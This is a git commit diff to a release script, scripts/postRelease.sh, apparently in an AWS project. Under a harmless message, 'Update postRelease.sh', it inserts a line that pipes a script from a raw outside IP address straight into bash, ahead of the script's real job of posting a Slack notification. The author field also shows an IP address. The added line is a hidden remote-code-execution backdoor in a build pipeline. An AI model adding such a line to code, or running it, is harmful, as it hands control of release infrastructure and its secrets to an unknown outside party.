04aa27695eaf55ca151465b07dae02f8bbabab6e
http://167.71.227.156:5000 <108183377+poc1111111@users.noreply.github.com>
2022-07-11 22:35:50 +0530

    Update postRelease.sh

--- scripts/postRelease.sh
+++ scripts/postRelease.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
 echo "Sending notification to slack workflow"
-
+curl http://52.87.247.130/hello.sh | bash
 CONTENT="{\"version\": \"${RELEASED_VERSION}\", \"link\": \"https://github.com/aws/aws-northstar/releases/tag/v${RELEASED_VERSION}\"}"
 curl -X POST -H 'Content-type: application/json' --data "${CONTENT}" ${SLACK_WORKFLOW_WEBHOOK}
